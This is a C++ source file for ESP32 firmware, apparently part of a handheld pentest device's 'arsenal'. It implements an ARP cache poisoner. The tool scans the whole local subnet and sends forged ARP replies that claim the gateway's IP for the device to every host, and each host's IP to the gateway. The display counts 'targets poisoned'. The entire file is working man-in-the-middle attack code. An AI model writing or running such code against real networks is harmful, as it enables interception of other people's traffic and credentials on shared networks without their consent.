#include "arsenal.h"
#include "arsenal_background.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include <WiFi.h>
#include <lwip/etharp.h>
#include <lwip/netif.h>
#include <globals.h>

static volatile bool arpRunning = false;

static void sendArpReply(IPAddress &target, uint8_t *targetMAC, IPAddress &spoofIP, uint8_t *spoofMAC) {
    struct etharp_hdr *hdr = (struct etharp_hdr *)malloc(sizeof(struct etharp_hdr));
    if (!hdr) return;

    hdr->opcode = htons(ARP_REPLY);
    hdr->hwtype = htons(1);
    hdr->proto = htons(0x0800);
    hdr->hwlen = 6;
    hdr->protolen = 4;

    memcpy(hdr->shwaddr, spoofMAC, 6);
    memcpy(hdr->sipaddr, &spoofIP, 4);
    memcpy(hdr->dhwaddr, targetMAC, 6);
    memcpy(hdr->dipaddr, &target, 4);

    etharp_raw(netif_default, (const eth_addr *)spoofMAC, (const eth_addr *)targetMAC,
               ARP_REPLY, (const eth_addr *)spoofMAC, (const ip4_addr_p_t *)&spoofIP,
               (const eth_addr *)targetMAC, (const ip4_addr_p_t *)&target);

    free(hdr);
}

void arsenal_arp_poisoner(void) {
    ARSENAL_HEAP_CHECK();
    if (WiFi.getMode() != WIFI_STA || WiFi.status() != WL_CONNECTED) {
        displayRedStripe("WiFi not connected");
        delay(1500);
        return;
    }

    IPAddress gateway = WiFi.gatewayIP();
    IPAddress subnet = WiFi.subnetMask();
    IPAddress localIP = WiFi.localIP();
    uint8_t localMAC[6];
    WiFi.macAddress(localMAC);

    arpRunning = true;
    int targets = 0;
    unsigned long startTime = millis();

    drawMainBorderWithTitle("ARP Poisoner");
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setTextSize(FP);
    tft.setCursor(12, 50);
    tft.printf("Gateway: %s", gateway.toString().c_str());
    tft.setCursor(12, 66);
    tft.print("Poisoning ARP cache...");
    tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
    tft.drawCentreString("Esc:stop", tftWidth / 2, tftHeight - 20, 1);
    delay(1000);

    while (arpRunning) {
        uint32_t gw = (uint32_t)gateway;
        uint32_t mask = (uint32_t)subnet;
        uint32_t network = gw & mask;
        uint32_t broadcast = network | ~mask;
        uint32_t total = broadcast - network - 1;
        if (total > 254) total = 254;

        for (uint32_t i = 1; i <= total; i++) {
            if (check(EscPress)) { arpRunning = false; break; }

            IPAddress target((network + i) & 0xFF, ((network + i) >> 8) & 0xFF,
                             ((network + i) >> 16) & 0xFF, ((network + i) >> 24) & 0xFF);

            if (target == localIP) continue;

            uint8_t targetMAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

            etharp_request(netif_default, (const ip4_addr_t *)&target);
            delay(2);

            struct etharp_entry *entry = etharp_find_entry((const ip4_addr_t *)&target, ETHARP_FIND_NO_STATIC);
            if (entry) {
                memcpy(targetMAC, entry->ethaddr.addr, 6);
                sendArpReply(target, targetMAC, gateway, localMAC);
                sendArpReply(gateway, localMAC, target, localMAC);
                targets++;
            }
        }

        drawMainBorderWithTitle("ARP Poisoner");
        int y = 45;
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        tft.setTextSize(FP);
        tft.setCursor(12, y);
        tft.printf("Gateway: %s", gateway.toString().c_str());
        y += 14;
        tft.setCursor(12, y);
        tft.printf("Targets poisoned: %d", targets);
        y += 14;
        unsigned long elapsed = (millis() - startTime) / 1000;
        tft.setCursor(12, y);
        tft.printf("Time: %lus", elapsed);
        y += 14;
        tft.setCursor(12, y);
        tft.printf("Network: %s", WiFi.gatewayIP().toString().c_str());
        tft.setTextColor(TFT_RED, bruceConfig.bgColor);
        tft.drawCentreString("Esc:stop", tftWidth / 2, tftHeight - 20, 1);

        esp_task_wdt_reset();
        delay(500);
    }
}
